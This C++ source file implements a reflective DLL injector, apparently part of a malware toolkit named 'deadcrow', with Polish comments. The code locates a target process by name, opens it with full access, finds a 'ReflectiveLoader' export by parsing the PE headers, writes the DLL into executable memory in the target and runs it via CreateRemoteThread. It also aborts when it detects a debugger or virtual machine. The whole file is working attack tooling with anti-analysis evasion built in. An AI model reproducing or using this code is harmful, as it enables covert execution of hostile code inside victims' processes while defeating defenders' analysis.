#include "reflective_injector.h"
#include "../utils/anti_debug.h"
#include <iostream>
#include <fstream>
#include <TlHelp32.h>

namespace deadcrow {
namespace injector {

ReflectiveInjector::ReflectiveInjector() {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[INJECTOR] " << status << std::endl;
        #endif
    };
}

bool ReflectiveInjector::injectDll(const std::string& process_name, const std::vector<uint8_t>& dll_data) {
    reportStatus("Wstrzykiwanie DLL do procesu: " + process_name);
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Znajdź PID procesu
    DWORD process_id = findProcessId(process_name);
    if (process_id == 0) {
        reportStatus("Nie znaleziono procesu: " + process_name);
        return false;
    }
    
    return injectDll(process_id, dll_data);
}

bool ReflectiveInjector::injectDll(DWORD process_id, const std::vector<uint8_t>& dll_data) {
    reportStatus("Wstrzykiwanie DLL do procesu o PID: " + std::to_string(process_id));
    
    // Sprawdź, czy nie jesteśmy debugowani
    if (checkForDebugging()) {
        reportStatus("Wykryto debugowanie lub środowisko wirtualne. Przerywanie.");
        return false;
    }
    
    // Otwórz proces
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (process_handle == NULL) {
        reportStatus("Nie udało się otworzyć procesu. Kod błędu: " + std::to_string(GetLastError()));
        return false;
    }
    
    // Wykonaj refleksyjne wstrzyknięcie
    bool result = reflectiveInject(process_handle, dll_data);
    
    // Zamknij uchwyt procesu
    CloseHandle(process_handle);
    
    return result;
}

bool ReflectiveInjector::injectDllFromFile(const std::string& process_name, const std::string& dll_path) {
    reportStatus("Wstrzykiwanie DLL z pliku: " + dll_path + " do procesu: " + process_name);
    
    // Wczytaj DLL z pliku
    std::vector<uint8_t> dll_data = loadDllFromFile(dll_path);
    if (dll_data.empty()) {
        reportStatus("Nie udało się wczytać DLL z pliku");
        return false;
    }
    
    return injectDll(process_name, dll_data);
}

bool ReflectiveInjector::injectDllFromFile(DWORD process_id, const std::string& dll_path) {
    reportStatus("Wstrzykiwanie DLL z pliku: " + dll_path + " do procesu o PID: " + std::to_string(process_id));
    
    // Wczytaj DLL z pliku
    std::vector<uint8_t> dll_data = loadDllFromFile(dll_path);
    if (dll_data.empty()) {
        reportStatus("Nie udało się wczytać DLL z pliku");
        return false;
    }
    
    return injectDll(process_id, dll_data);
}

DWORD ReflectiveInjector::findProcessId(const std::string& process_name) {
    reportStatus("Szukanie procesu: " + process_name);
    
    DWORD process_id = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        reportStatus("Nie udało się utworzyć snapshota procesów");
        return 0;
    }
    
    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        reportStatus("Nie udało się pobrać pierwszego procesu");
        return 0;
    }
    
    do {
        if (_stricmp(process_entry.szExeFile, process_name.c_str()) == 0) {
            process_id = process_entry.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &process_entry));
    
    CloseHandle(snapshot);
    
    if (process_id == 0) {
        reportStatus("Nie znaleziono procesu: " + process_name);
    } else {
        reportStatus("Znaleziono proces: " + process_name + " (PID: " + std::to_string(process_id) + ")");
    }
    
    return process_id;
}

std::vector<std::pair<DWORD, std::string>> ReflectiveInjector::listProcesses() {
    reportStatus("Listowanie procesów");
    
    std::vector<std::pair<DWORD, std::string>> processes;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (snapshot == INVALID_HANDLE_VALUE) {
        reportStatus("Nie udało się utworzyć snapshota procesów");
        return processes;
    }
    
    PROCESSENTRY32 process_entry;
    process_entry.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &process_entry)) {
        CloseHandle(snapshot);
        reportStatus("Nie udało się pobrać pierwszego procesu");
        return processes;
    }
    
    do {
        processes.push_back(std::make_pair(process_entry.th32ProcessID, process_entry.szExeFile));
    } while (Process32Next(snapshot, &process_entry));
    
    CloseHandle(snapshot);
    
    reportStatus("Znaleziono " + std::to_string(processes.size()) + " procesów");
    return processes;
}

std::vector<uint8_t> ReflectiveInjector::loadDllFromFile(const std::string& dll_path) {
    reportStatus("Wczytywanie DLL z pliku: " + dll_path);
    
    std::ifstream file(dll_path, std::ios::binary);
    if (!file) {
        reportStatus("Nie udało się otworzyć pliku");
        return {};
    }
    
    // Pobierz rozmiar pliku
    file.seekg(0, std::ios::end);
    size_t file_size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    // Wczytaj dane
    std::vector<uint8_t> buffer(file_size);
    file.read(reinterpret_cast<char*>(buffer.data()), file_size);
    
    if (!file) {
        reportStatus("Nie udało się wczytać pliku");
        return {};
    }
    
    reportStatus("Wczytano DLL: " + std::to_string(buffer.size()) + " bajtów");
    return buffer;
}

bool ReflectiveInjector::reflectiveInject(HANDLE process_handle, const std::vector<uint8_t>& dll_data) {
    reportStatus("Wykonywanie refleksyjnego wstrzyknięcia");
    
    // Znajdź offset funkcji ReflectiveLoader w DLL
    DWORD reflective_loader_offset = findReflectiveLoaderOffset(dll_data);
    if (reflective_loader_offset == 0) {
        reportStatus("Nie znaleziono funkcji ReflectiveLoader w DLL");
        return false;
    }
    
    // Alokuj pamięć w zdalnym procesie
    LPVOID remote_dll_base = allocateMemoryInProcess(process_handle, dll_data.size());
    if (remote_dll_base == NULL) {
        reportStatus("Nie udało się zaalokować pamięci w zdalnym procesie");
        return false;
    }
    
    // Zapisz DLL do pamięci zdalnego procesu
    if (!writeMemoryToProcess(process_handle, remote_dll_base, dll_data.data(), dll_data.size())) {
        reportStatus("Nie udało się zapisać DLL do pamięci zdalnego procesu");
        return false;
    }
    
    // Oblicz adres funkcji ReflectiveLoader w zdalnym procesie
    LPVOID remote_reflective_loader = (LPVOID)((DWORD_PTR)remote_dll_base + reflective_loader_offset);
    
    // Utwórz zdalny wątek, który wywoła funkcję ReflectiveLoader
    HANDLE remote_thread = createRemoteThread(process_handle, remote_reflective_loader, remote_dll_base);
    if (remote_thread == NULL) {
        reportStatus("Nie udało się utworzyć zdalnego wątku");
        return false;
    }
    
    // Poczekaj na zakończenie wątku
    WaitForSingleObject(remote_thread, INFINITE);
    
    // Pobierz kod wyjścia wątku
    DWORD exit_code = 0;
    GetExitCodeThread(remote_thread, &exit_code);
    
    // Zamknij uchwyt wątku
    CloseHandle(remote_thread);
    
    if (exit_code == 0) {
        reportStatus("Refleksyjne wstrzyknięcie nie powiodło się");
        return false;
    }
    
    reportStatus("Refleksyjne wstrzyknięcie zakończone pomyślnie");
    return true;
}

DWORD ReflectiveInjector::findReflectiveLoaderOffset(const std::vector<uint8_t>& dll_data) {
    reportStatus("Szukanie funkcji ReflectiveLoader w DLL");
    
    // Sprawdź, czy DLL ma poprawny nagłówek PE
    if (dll_data.size() < 0x1000 || dll_data[0] != 'M' || dll_data[1] != 'Z') {
        reportStatus("Nieprawidłowy nagłówek PE");
        return 0;
    }
    
    // Pobierz offset do nagłówka PE
    DWORD pe_offset = *reinterpret_cast<const DWORD*>(&dll_data[0x3C]);
    if (pe_offset + 0x88 > dll_data.size()) {
        reportStatus("Nieprawidłowy offset nagłówka PE");
        return 0;
    }
    
    // Pobierz offset do tablicy eksportów
    DWORD export_dir_rva = *reinterpret_cast<const DWORD*>(&dll_data[pe_offset + 0x78]);
    DWORD export_dir_size = *reinterpret_cast<const DWORD*>(&dll_data[pe_offset + 0x7C]);
    
    if (export_dir_rva == 0 || export_dir_size == 0) {
        reportStatus("Brak tablicy eksportów");
        return 0;
    }
    
    // Konwersja RVA na offset w pliku
    DWORD section_header_offset = pe_offset + 0x18 + *reinterpret_cast<const WORD*>(&dll_data[pe_offset + 0x14]);
    WORD num_sections = *reinterpret_cast<const WORD*>(&dll_data[pe_offset + 0x6]);
    
    DWORD export_dir_offset = 0;
    for (WORD i = 0; i < num_sections; i++) {
        DWORD section_rva = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x0C]);
        DWORD section_size = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x10]);
        DWORD section_offset = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x14]);
        
        if (export_dir_rva >= section_rva && export_dir_rva < section_rva + section_size) {
            export_dir_offset = section_offset + (export_dir_rva - section_rva);
            break;
        }
    }
    
    if (export_dir_offset == 0) {
        reportStatus("Nie udało się znaleźć offsetu tablicy eksportów");
        return 0;
    }
    
    // Pobierz informacje o eksportach
    DWORD num_names = *reinterpret_cast<const DWORD*>(&dll_data[export_dir_offset + 0x18]);
    DWORD names_rva = *reinterpret_cast<const DWORD*>(&dll_data[export_dir_offset + 0x20]);
    DWORD ordinals_rva = *reinterpret_cast<const DWORD*>(&dll_data[export_dir_offset + 0x24]);
    DWORD functions_rva = *reinterpret_cast<const DWORD*>(&dll_data[export_dir_offset + 0x1C]);
    
    // Konwersja RVA na offsety w pliku
    DWORD names_offset = 0;
    DWORD ordinals_offset = 0;
    DWORD functions_offset = 0;
    
    for (WORD i = 0; i < num_sections; i++) {
        DWORD section_rva = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x0C]);
        DWORD section_size = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x10]);
        DWORD section_offset = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + i * 0x28 + 0x14]);
        
        if (names_rva >= section_rva && names_rva < section_rva + section_size) {
            names_offset = section_offset + (names_rva - section_rva);
        }
        
        if (ordinals_rva >= section_rva && ordinals_rva < section_rva + section_size) {
            ordinals_offset = section_offset + (ordinals_rva - section_rva);
        }
        
        if (functions_rva >= section_rva && functions_rva < section_rva + section_size) {
            functions_offset = section_offset + (functions_rva - section_rva);
        }
    }
    
    if (names_offset == 0 || ordinals_offset == 0 || functions_offset == 0) {
        reportStatus("Nie udało się znaleźć offsetów tablic eksportów");
        return 0;
    }
    
    // Szukaj funkcji ReflectiveLoader
    for (DWORD i = 0; i < num_names; i++) {
        DWORD name_rva = *reinterpret_cast<const DWORD*>(&dll_data[names_offset + i * 4]);
        
        // Konwersja RVA na offset w pliku
        DWORD name_offset = 0;
        for (WORD j = 0; j < num_sections; j++) {
            DWORD section_rva = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + j * 0x28 + 0x0C]);
            DWORD section_size = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + j * 0x28 + 0x10]);
            DWORD section_offset = *reinterpret_cast<const DWORD*>(&dll_data[section_header_offset + j * 0x28 + 0x14]);
            
            if (name_rva >= section_rva && name_rva < section_rva + section_size) {
                name_offset = section_offset + (name_rva - section_rva);
                break;
            }
        }
        
        if (name_offset == 0) {
            continue;
        }
        
        // Sprawdź, czy to funkcja ReflectiveLoader
        std::string function_name(reinterpret_cast<const char*>(&dll_data[name_offset]));
        if (function_name == "ReflectiveLoader") {
            WORD ordinal = *reinterpret_cast<const WORD*>(&dll_data[ordinals_offset + i * 2]);
            DWORD function_rva = *reinterpret_cast<const DWORD*>(&dll_data[functions_offset + ordinal * 4]);
            
            reportStatus("Znaleziono funkcję ReflectiveLoader (RVA: " + std::to_string(function_rva) + ")");
            return function_rva;
        }
    }
    
    reportStatus("Nie znaleziono funkcji ReflectiveLoader");
    return 0;
}

LPVOID ReflectiveInjector::allocateMemoryInProcess(HANDLE process_handle, SIZE_T size) {
    reportStatus("Alokacja pamięci w zdalnym procesie");
    
    LPVOID address = VirtualAllocEx(process_handle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (address == NULL) {
        reportStatus("Nie udało się zaalokować pamięci. Kod błędu: " + std::to_string(GetLastError()));
    } else {
        reportStatus("Zaalokowano pamięć pod adresem: " + std::to_string(reinterpret_cast<DWORD_PTR>(address)));
    }
    
    return address;
}

bool ReflectiveInjector::writeMemoryToProcess(HANDLE process_handle, LPVOID address, const void* data, SIZE_T size) {
    reportStatus("Zapisywanie danych do pamięci zdalnego procesu");
    
    SIZE_T bytes_written = 0;
    if (!WriteProcessMemory(process_handle, address, data, size, &bytes_written) || bytes_written != size) {
        reportStatus("Nie udało się zapisać danych. Kod błędu: " + std::to_string(GetLastError()));
        return false;
    }
    
    reportStatus("Zapisano " + std::to_string(bytes_written) + " bajtów");
    return true;
}

HANDLE ReflectiveInjector::createRemoteThread(HANDLE process_handle, LPVOID start_address, LPVOID parameter) {
    reportStatus("Tworzenie zdalnego wątku");
    
    HANDLE thread_handle = CreateRemoteThread(process_handle, NULL, 0, 
                                           (LPTHREAD_START_ROUTINE)start_address, 
                                           parameter, 0, NULL);
    
    if (thread_handle == NULL) {
        reportStatus("Nie udało się utworzyć zdalnego wątku. Kod błędu: " + std::to_string(GetLastError()));
    } else {
        reportStatus("Utworzono zdalny wątek");
    }
    
    return thread_handle;
}

void ReflectiveInjector::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void ReflectiveInjector::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

bool ReflectiveInjector::checkForDebugging() {
    return utils::AntiDebug::performAllChecks();
}

} // namespace injector
} // namespace deadcrow
